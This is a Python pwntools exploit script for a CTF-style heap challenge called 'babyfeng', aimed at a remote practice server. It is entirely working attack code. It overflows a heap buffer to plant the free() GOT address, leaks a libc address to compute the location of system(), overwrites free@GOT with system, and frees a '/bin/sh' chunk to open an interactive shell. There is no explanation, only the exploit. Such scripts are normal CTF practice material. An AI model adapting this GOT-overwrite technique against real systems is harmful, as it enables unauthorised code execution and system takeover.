from pwn import *
context.log_level = 'debug'
#p = process('./babyfeng')
elf = ELF("./babyfeng")
p = remote('pwn.buuoj.cn', 20002)
libc = ELF("./x86_libc.so.6")
#libc = ELF("./libc-2.23.so")
if args.G:
    gdb.attach(p)

def add(nsize, name, dsize, des):
    p.recvuntil("Action: ")
    p.sendline("0")
    p.recvuntil("description: ")
    p.sendline(str(nsize))
    p.recvuntil("name: ")
    p.sendline(name)
    p.recvuntil("text length: ")
    p.sendline(str(dsize))
    p.recvuntil("text: ")
    p.sendline(des)

def free(idx):
    p.recvuntil("Action: ")
    p.sendline("1")
    p.recvuntil("index: ")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("Action: ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))

def edit(idx, size, text):
    p.recvuntil("Action: ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("text length: ")
    p.sendline(str(size))
    p.recvuntil("text: ")
    p.sendline(text)

def exp():
    add(0x80,'a',0x80,'a')
    add(0x80, 'b', 0x80, 'b')
    add(0x10, '/bin/sh\x00', 0x10, '/bin/sh\x00')
    free(0)
    add(0x100, 'a', 0x19c, 'a'*0x198 + p32(elf.got['free']))
    show(1)
    p.recvuntil("description: ")
    free_addr = u32(p.recv(4))
    log.success("free_addr isa " + hex(free_addr))
    libc_base = free_addr - libc.sym['free'] 
    system_addr = libc_base + libc.sym['system']
    edit(1, 4, p32(system_addr))
    log.success("system_addr is " + hex(system_addr))
    log.success("libc_base is " + hex(libc_base)) 
    free(2)
    p.interactive()

if __name__ == '__main__':
    exp()
